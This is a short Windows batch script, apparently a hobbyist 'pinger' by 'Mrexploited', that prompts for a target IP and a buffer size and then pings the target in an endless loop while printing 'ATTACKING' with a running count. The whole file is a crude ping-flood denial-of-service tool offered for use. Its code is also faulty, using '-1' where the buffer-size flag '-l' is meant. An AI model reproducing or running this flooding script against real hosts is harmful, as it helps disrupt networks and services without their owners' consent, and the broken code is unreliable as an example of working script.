title::Pinger::
echo off
color 3
title Pinger by Mrexploited
echo     ---------------------------------------                                           
echo          -----------------------------
echo              -----------------                                         
echo                 Mr Exploied
echo               -----------------
echo          ------------------------------
echo     ----------------------------------------
echo --------------------------------------------------
echo                  I'm a pinger
echo -------------CTRL+C to stop Pinging--------------
set /p IP=Target IP::
echo MrExploited
set /p Puffer=SenderPuffer:

:ping
set /a Send=%Send%+1
ping %IP% -1 %Puffer% -w 15 -n 1 >NULL
echo ATTACKING :%IP% :%Puffer% :%Send%
goto Ping